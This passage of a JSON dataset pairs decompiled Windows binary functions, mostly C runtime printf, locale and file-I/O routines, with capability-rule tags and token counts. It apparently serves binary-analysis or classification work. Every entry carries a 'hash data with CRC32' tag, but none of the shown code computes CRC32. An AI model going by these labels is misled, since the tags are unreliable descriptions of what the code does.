cVar4 = fcn.004049d5();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00404be7();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049e258;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049e208:\n            cVar4 = fcn.00404bdd(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.00402301();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049e258;\n            if (cVar4 == 'i') goto code_r0x0049e248;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.0040236f();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004045de();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049e1f4;\n            }\n            goto code_r0x0049e24c;\n        }\ncode_r0x0049e1dc:\n        cVar4 = fcn.00403f3a();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x0049e2de;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049e2de:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403cd3(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.00405df8(&var_4h, arg_ch, arg_14h, in_ECX + 0xc);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403cd3(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00401307(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403cd3(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1696
    },
    "00402360": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00402360(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0xffff;\n    if (arg_8h != -1) {\n        fcn.004057e5(arg_ch);\n        if (arg_8h < 0x100) {\n            uVar3 = arg_8h;\n            if ((*(\n                  L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                  + (arg_8h & 0xff)) & 1) != 0) {\n                uVar3 = *(*(var_10h + 0x94) + (arg_8h & 0xff));\n            }\n            uVar1 = uVar3;\n        }\n        else if (*(var_10h + 0xa8) == 0) {\n            uVar1 = arg_8h & 0xffff;\n        }\n        else {\n            iVar2 = fcn.00401f55(*(var_10h + 0xa8), 0x100, &arg_8h, 1, &var_4h, 1);\n            if (iVar2 == 0) {\n                uVar1 = arg_8h & 0xffff;\n            }\n            else {\n                uVar1 = var_4h;\n            }\n        }\n        if (var_8h != '\\0') {\n            *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 733
    },
    "004024be": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.004024be(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b3d8, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x570488)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x570220) + 0x28 + iVar3) & 1) != 0) {\n                fcn.0040151e(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x570220) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.004039a4();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0040185c();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.00401dc0(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004cf87a();\n                goto code_r0x004cf89d;\n            }\n        }\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n        fcn.00403751();\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004cf89d:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 662
    },
    "0040250e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040250e(void)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    char **ppcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *piVar9;\n    char **ppcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    int16_t **ppiVar13;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    char *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004057e5(0);\n    pcVar11 = 0x164;\n    var_10h = NULL;\n    var_8h = 0;\n    ppcVar4 = *(var_24h + 0x9c);\n    var_ch = 0;\n    do {\n        pcVar12 = pcVar11;\n        if (var_8h == 1) {\n            iVar6 = fcn.00403ff3(pcVar11);\n            var_ch = 0;\n            if (iVar6 == 0) break;\n            fcn.0040314d(iVar6, 0, pcVar11);\n            pcVar12 = 0x164;\n            var_10h = pcVar11;\n            var_ch = iVar6;\n        }\n        iVar6 = var_ch - ppcVar4;\n        var_18h = 0;\n        ppcVar10 = ppcVar4;\n        do {\n            if (var_8h == 1) {\n                *(iVar6 + ppcVar10) = pcVar12 + var_ch;\n                iVar7 = fcn.00405f56(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            var_18h = var_18h + 1;\n            ppcVar10 = ppcVar10 + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 7;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00405f56(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0xe;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00405f56(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0x1a;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00405f56(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppcVar10 = ppcVar4 + 0x26;\n        do {\n            if (var_8h == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + var_ch;\n                iVar7 = fcn.00405f56(pcVar12 + var_ch, var_10h - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            var_18h = var_18h + 1;\n        } while (var_18h < 2);\n        if (var_8h == 1) {\n            *(var_ch + 0xa0) = pcVar12 + var_ch;\n            iVar7 = fcn.00405f56(pcVar12 + var_ch, var_10h - pcVar12, ppcVar4[0x28]);\n            if (iVar7 != 0) goto code_r0x004bcbd2;\n        }\n        pcVar8 = ppcVar4[0x28];\n        pcVar11 = pcVar8 + 1;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        pcVar8 = pcVar8 + pcVar12 + (1 - pcVar11);\n        if (var_8h == 1) {\n            *(var_ch + 0xa4) = pcVar8 + var_ch;\n            iVar7 = fcn.00405f56(pcVar8 + var_ch, var_10h - pcVar8, ppcVar4[0x29]);\n            if (iVar7 != 0) goto code_r0x004bcbd2;\n        }\n        pcVar12 = ppcVar4[0x29];\n        pcVar11 = pcVar12 + 1;\n        do {\n            cVar2 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar2 != '\\0');\n        pcVar12 = pcVar12 + pcVar8 + (1 - pcVar11);\n        if (var_8h == 1) {\n            *(var_ch + 0xa8) = pcVar12 + var_ch;\n            iVar7 = fcn.00405f56(pcVar12 + var_ch, var_10h - pcVar12, ppcVar4[0x2a]);\n            if (iVar7 != 0) goto code_r0x004bcbd2;\n        }\n        pcVar11 = ppcVar4[0x2a];\n        pcVar8 = pcVar11 + 1;\n        do {\n            cVar2 = *pcVar11;\n            pcVar11 = pcVar11 + 1;\n        } while (cVar2 != '\\0');\n        pcVar11 = pcVar11 + pcVar12 + (1 - pcVar8);\n        if (var_8h == 1) {\n            *(var_ch + 0xac) = ppcVar4[0x2b];\n            *(var_ch + 0xb0) = 0;\n        }\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x2d;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x34;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 7);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x3b;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x47;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 0xc);\n        var_18h = 0;\n        ppiVar13 = ppcVar4 + 0x53;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 2);\n        for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x154) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x55]);\n            if (iVar6 != 0) goto code_r0x004bcbd2;\n        }\n        piVar9 = ppcVar4[0x55];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x158) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x56]);\n            if (iVar6 != 0) goto code_r0x004bcbd2;\n        }\n        piVar9 = ppcVar4[0x56];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x15c) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x57]);\n            if (iVar6 != 0) goto code_r0x004bcbd2;\n        }\n        piVar9 = ppcVar4[0x57];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x160) = iVar6;\n            iVar6 = fcn.004038dc(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x58]);\n            if (iVar6 != 0) {\ncode_r0x004bcbd2:\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar5 = swi(3);\n                iVar6 = (*pcVar5)();\n                return iVar6;\n            }\n        }\n        piVar9 = ppcVar4[0x58];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        var_8h = var_8h + 1;\n        pcVar11 = pcVar11 + ((piVar9 - piVar1 >> 1) + 1) * 2;\n    } while (var_8h < 2);\n    if (var_1ch != '\\0') {\n        *(var_28h + 0x350) = *(var_28h + 0x350) & 0xfffffffd;\n    }\n    return var_ch;\n}\n",
        "token_count": 4449
    },
    "0046bb6c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bb6c(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0046be5f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046be5f(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "004025ea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004025ea(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00404af7(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "00402608": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402608(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.004042fa(8, 0);\n    return;\n}\n",
        "token_count": 90
    },
    "004027d9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.004027d9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b438, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n    }\n    else {\n        if ((lpCriticalSection < 0) || (*0x570488 <= lpCriticalSection)) {\ncode_r0x004d160c:\n            puVar1 = fcn.0040185c();\n            *puVar1 = 0;\n            puVar1 = fcn.004039a4();\n            *puVar1 = 9;\n        }\n        else {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(iVar3 + 0x28 + *((lpCriticalSection >> 6) * 4 + 0x570220)) & 1) == 0) goto code_r0x004d160c;\n            if (*(unaff_EBP + 0x10) < 0x80000000) {\n                fcn.0040151e(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*(unaff_EBP + -0x20) + 0x28 + *((lpCriticalSection >> 6) * 4 + 0x570220)) & 1) == 0) {\n                    puVar1 = fcn.004039a4();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0040185c();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.00406177(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004d1604();\n                goto code_r0x004d1627;\n            }\n            puVar1 = fcn.0040185c();\n            *puVar1 = 0;\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n        }\n        fcn.00403751();\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004d1627:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 748
    },
    "004028ba": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004028ba(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.004068a7(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "004028bf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004028bf(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049e7d7:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x0049e7db:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049e7de:\n            cVar4 = fcn.00404af7(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049e783:\n                arg_8h = 0x10;\n                goto code_r0x0049e7de;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049e797;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049e76b;\n                }\n            }\ncode_r0x0049e7e7:\n            cVar4 = fcn.0040393b();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00401d07();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049e7e7;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049e797:\n            cVar4 = fcn.00401f5a(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.0040114a();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049e7e7;\n            if (cVar4 == 'i') goto code_r0x0049e7d7;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00404421();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.004025ea();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049e783;\n            }\n            goto code_r0x0049e7db;\n        }\ncode_r0x0049e76b:\n        cVar4 = fcn.004020f4();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = 